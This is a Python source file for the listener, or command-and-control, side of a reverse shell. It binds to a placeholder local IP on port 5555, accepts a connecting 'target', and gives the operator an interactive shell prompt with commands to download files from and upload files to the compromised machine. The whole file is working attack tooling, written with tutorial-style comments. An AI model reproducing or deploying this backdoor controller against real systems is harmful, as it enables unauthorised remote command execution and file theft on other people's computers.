import socket
import json
import os


# json dumps the desired command, encodes it, and then sends it to the TARGET via socket's send function.
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


# Uses socket's recv function to grab 1024 bites of data at a time from TARGET and adds to data variable.
def reliable_recieve():
    data = ''
    while True:
        try:
            # Decodes and right-strips the encoded data, before its re-encoded.
            data = data + target.recv(1024).decode().rstrip()
            # Returns json formatted data
            return json.loads(data)
        except ValueError:
            continue


# A function to upload files to the TARGET.
def upload_file(file_name):
    # Assign file object to store file content - READ bits privilege.
    fo = open(file_name, 'rb')
    target.send(fo.read())


# Function to download files
def download_file(file_name):
    # Assign file object to store file content - WRITE bits privilege.
    fo = open(file_name, 'wb')
    # Sets timeout in case download becomes hung, avoiding crash.
    target.settimeout(1)
    # Assign chunks of data that will be received multiple times. - 1024 bites per chunk.
    chunk = target.recv(1024)
    # Continues to add to the chunk variable until there is no remaining data left in the file being sent.
    while chunk:
        fo.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    fo.close()


# Send commands to target system, and receive response from target.
def target_communication():
    while True:
        # Input for desired command.
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        # Add 'quit', 'clear', and 'cd' command.
        if command.lower() == 'quit':
            break
        elif command.lower() == 'clear':
            os.system('clear')
        # Finds what directory to change into based on what is entered after the initial 3 character "cd ".
        elif command[:3].lower() == 'cd ':
            pass
        # Adding a download command, only looks at length of 'download'
        elif command[:8].lower() == 'download':
            # Runs download_file function on whatever is after the 'download ' command.
            download_file(command[9:])
        # Assigns 'upload' command to upload_file function
        elif command[:6].lower() == 'upload':
            # Runs upload_file function on whatever is after the 'upload ' command.
            upload_file(command[7:])
        else:
            # Print the result of the recieving response from the target in json format.
            result = reliable_recieve()
            print(result)


# Initiating socket object; specifying connection over IPv4, using TCP connection.
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Binding the LHOST IP address to the designated LPORT.



# **************************************************************************
# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
# **************************************************************************
sock.bind(('ENTER LHOST IP HERE', 5555))
# **************************************************************************
# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
# **************************************************************************



# Listen for up to 5 incoming connections from reverse shell.
print('[+] Listening for the incoming connections...')
sock.listen(5)
# Stores the incoming connection's object and IP.
target, ip = sock.accept()
print('[+] Target connected from: ' + str(ip))

target_communication()
